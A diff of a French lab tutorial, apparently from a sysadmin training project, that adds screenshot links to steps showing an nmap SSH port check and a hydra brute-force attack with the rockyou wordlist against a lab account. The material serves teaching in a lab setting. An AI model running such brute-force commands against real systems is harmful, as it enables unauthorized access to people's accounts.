@@ -173,7 +173,7 @@ Pour pouvoir attaquer le mot de passe d'un compte local , ici sur Windows serveu
 ```bash 
 nmap -p 22 172.16.10.5
 ```
-![CHECKIP]()
+![CHECKIP](https://github.com/WildCodeSchool/TSSR-0226-P1-G1/blob/main/SCREENSHOT/CHECK_SSH.png)
 
 Une fois la vérification faîtes, nous allons télécharger une worldlist pour pouvoir lancer l'attaque.
 
@@ -186,7 +186,7 @@ On peut maintenant lancer l'attaque pour récupérer le mot de passe Utilisateur
 ``` bash
 hydra -l Wilder -P rockyou.txt -t 1 -W 10 ssh://172.16.10.5
 ```
-![RESULTAT]()
+![RESULTAT](https://github.com/WildCodeSchool/TSSR-0226-P1-G1/blob/main/SCREENSHOT/FINAL_HYDRA.png)
 
 Voilà, vous avez récupéré le mot de passe utilisateur.
 ## FAQ
